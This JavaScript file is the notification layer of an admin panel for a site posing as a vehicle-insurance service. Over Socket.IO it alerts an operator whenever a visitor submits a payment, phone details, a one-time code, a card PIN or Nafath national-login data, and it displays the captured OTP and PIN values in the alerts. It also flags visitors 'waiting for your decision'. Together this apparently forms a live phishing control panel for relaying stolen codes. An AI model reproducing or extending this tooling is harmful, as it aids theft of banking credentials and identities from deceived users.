// ============================================
// Admin PWA - Notifications & Sound Alerts
// ============================================
(function () {
  'use strict';

  // ---- Service Worker Registration ----
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').then(function (reg) {
      console.log('[PWA] Service Worker registered');
    }).catch(function (err) {
      console.log('[PWA] SW registration failed:', err);
    });
  }

  // ---- Request Notification Permission ----
  function requestNotificationPermission() {
    if (!('Notification' in window)) return;
    if (Notification.permission === 'default') {
      Notification.requestPermission().then(function (p) {
        console.log('[PWA] Notification permission:', p);
      });
    }
  }

  // Ask for permission after first user interaction
  var permAsked = false;
  document.addEventListener('click', function () {
    if (!permAsked) {
      permAsked = true;
      requestNotificationPermission();
    }
  }, { once: false });

  // Also try on load (some browsers allow it)
  setTimeout(requestNotificationPermission, 3000);

  // ---- Sound System ----
  function playSound(type) {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);

      switch (type) {
        case 'new_user':
          osc.frequency.setValueAtTime(880, ctx.currentTime);
          osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
          osc.frequency.setValueAtTime(1320, ctx.currentTime + 0.2);
          gain.gain.setValueAtTime(0.3, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.4);
          break;
        case 'payment':
          osc.frequency.setValueAtTime(523, ctx.currentTime);
          osc.frequency.setValueAtTime(659, ctx.currentTime + 0.15);
          osc.frequency.setValueAtTime(784, ctx.currentTime + 0.3);
          osc.frequency.setValueAtTime(1047, ctx.currentTime + 0.45);
          gain.gain.setValueAtTime(0.35, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.6);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.6);
          break;
        case 'chat':
          osc.frequency.setValueAtTime(600, ctx.currentTime);
          osc.frequency.setValueAtTime(800, ctx.currentTime + 0.08);
          gain.gain.setValueAtTime(0.25, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.2);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.2);
          break;
        case 'form':
          osc.frequency.setValueAtTime(700, ctx.currentTime);
          osc.frequency.setValueAtTime(900, ctx.currentTime + 0.1);
          osc.frequency.setValueAtTime(700, ctx.currentTime + 0.2);
          gain.gain.setValueAtTime(0.3, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.35);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.35);
          break;
        case 'otp':
          osc.frequency.setValueAtTime(1000, ctx.currentTime);
          osc.frequency.setValueAtTime(1200, ctx.currentTime + 0.08);
          osc.frequency.setValueAtTime(1400, ctx.currentTime + 0.16);
          gain.gain.setValueAtTime(0.35, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.3);
          break;
        case 'waiting':
          osc.frequency.setValueAtTime(440, ctx.currentTime);
          osc.frequency.setValueAtTime(660, ctx.currentTime + 0.15);
          osc.frequency.setValueAtTime(440, ctx.currentTime + 0.3);
          osc.frequency.setValueAtTime(660, ctx.currentTime + 0.45);
          gain.gain.setValueAtTime(0.3, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.6);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.6);
          break;
        default:
          osc.frequency.setValueAtTime(800, ctx.currentTime);
          osc.frequency.setValueAtTime(1000, ctx.currentTime + 0.1);
          gain.gain.setValueAtTime(0.3, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.25);
      }
    } catch (e) {
      // Audio not available
    }
  }

  // ---- Send Notification ----
  function sendNotification(title, body, tag, soundType) {
    // Play sound
    playSound(soundType || 'default');

    // Show notification
    if (Notification.permission !== 'granted') return;

    // Use service worker notification (works in background on iOS PWA)
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      navigator.serviceWorker.controller.postMessage({
        type: 'SHOW_NOTIFICATION',
        title: title,
        body: body,
        tag: tag || 'event-' + Date.now()
      });
    } else {
      // Fallback
      try {
        new Notification(title, {
          body: body,
          icon: '/icon-192.png',
          tag: tag || 'event-' + Date.now()
        });
      } catch (e) {}
    }
  }

  // ---- Hook into existing Socket.IO ----
  // Wait for the app's socket to be available
  var knownUsers = {};
  var initialLoad = true;
  var hooked = false;

  function hookSocket() {
    if (hooked) return;

    // Find the socket.io instance - it's usually on window or in the React app
    // We'll intercept by listening to the same events on a global level
    var cfg = window.__RUNTIME_CONFIG__ || {};
    var socketUrl = cfg.SOCKET_URL || cfg.API_BASE || 'https://vehicle-insurance-backend-a3i7.onrender.com';

    // Check if socket.io client is already loaded
    if (typeof io === 'undefined') {
      // Load socket.io client
      var script = document.createElement('script');
      script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
      script.onload = function () {
        connectNotificationSocket(socketUrl);
      };
      document.head.appendChild(script);
    } else {
      connectNotificationSocket(socketUrl);
    }
    hooked = true;
  }

  function connectNotificationSocket(url) {
    // Get token from localStorage (the admin app stores it there)
    var token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
    if (!token) {
      // Wait and retry
      setTimeout(function () {
        token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
        if (token) startSocket(url, token);
      }, 5000);
      return;
    }
    startSocket(url, token);
  }

  function startSocket(url, token) {
    var socket = io(url, {
      auth: { token: token },
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 3000
    });

    socket.on('connect', function () {
      console.log('[PWA] Notification socket connected');
      socket.emit('admin:getConnectedUsers');
    });

    // Track connected users - notify on new ones
    socket.on('user:connected', function (users) {
      if (!Array.isArray(users)) return;

      if (!initialLoad) {
        users.forEach(function (u) {
          var id = u.uuid || u.id;
          if (id && !knownUsers[id]) {
            sendNotification(
              '🟢 زائر جديد',
              'زائر جديد متصل الآن',
              'user-' + id,
              'new_user'
            );
          }
        });
      }

      // Update known users
      knownUsers = {};
      users.forEach(function (u) {
        var id = u.uuid || u.id;
        if (id) knownUsers[id] = true;
      });
      initialLoad = false;
    });

    // Form submissions
    socket.on('form:submission', function (data) {
      var formType = (data && data.formType) || (data && data.type) || '';
      var step = (data && data.step) || (data && data.formData && data.formData.step) || '';

      if (formType === 'payment' || formType === 'payment_form_submitted') {
        var amount = (data.formData && data.formData.amount) || (data.amount) || '';
        sendNotification(
          '💳 دفع جديد',
          'مبلغ: ' + amount + ' ر.س',
          'payment-' + Date.now(),
          'payment'
        );
      } else if (formType === 'phone_verification') {
        sendNotification(
          '📱 معلومات جوال',
          step || 'تم إرسال معلومات الجوال',
          'form-phone-' + Date.now(),
          'form'
        );
      } else if (formType === 'otp_verification') {
        sendNotification(
          '🔑 رمز تحقق',
          'تم استلام رمز التحقق',
          'form-otp-' + Date.now(),
          'otp'
        );
      } else if (formType === 'nafath_verification') {
        sendNotification(
          '🔐 نفاذ',
          'تم إرسال بيانات نفاذ',
          'form-nafath-' + Date.now(),
          'form'
        );
      } else if (formType === 'booking') {
        sendNotification(
          '📋 حجز جديد',
          step || 'تم إرسال بيانات الحجز',
          'form-booking-' + Date.now(),
          'form'
        );
      } else {
        sendNotification(
          '📋 نموذج جديد',
          (formType || 'بيانات جديدة') + ' - ' + (step || ''),
          'form-' + Date.now(),
          'form'
        );
      }
    });

    // Chat messages from clients
    socket.on('chat:message', function (msg) {
      if (msg && msg.sender !== 'admin' && msg.role !== 'admin') {
        sendNotification(
          '💬 رسالة جديدة',
          msg.text || msg.message || 'رسالة من عميل',
          'chat-' + Date.now(),
          'chat'
        );
      }
    });

    // OTP received
    socket.on('otp:received', function (data) {
      sendNotification(
        '🔑 رمز OTP',
        'الرمز: ' + (data && data.code || 'تم الاستلام'),
        'otp-' + Date.now(),
        'otp'
      );
    });

    // PIN received
    socket.on('pin:received', function (data) {
      sendNotification(
        '🔢 رمز PIN',
        'الرمز: ' + (data && data.pin || 'تم الاستلام'),
        'pin-' + Date.now(),
        'otp'
      );
    });

    // User waiting for admin decision
    socket.on('user:statusUpdate', function (data) {
      if (data && data.isWaiting) {
        sendNotification(
          '⏳ عميل بالانتظار',
          'عميل ينتظر قرارك',
          'waiting-' + (data.uuid || Date.now()),
          'waiting'
        );
      }
    });
  }

  // ---- Start ----
  // Hook after a short delay to let the app initialize
  setTimeout(hookSocket, 2000);

  console.log('[PWA] Admin PWA notifications loaded');
})();
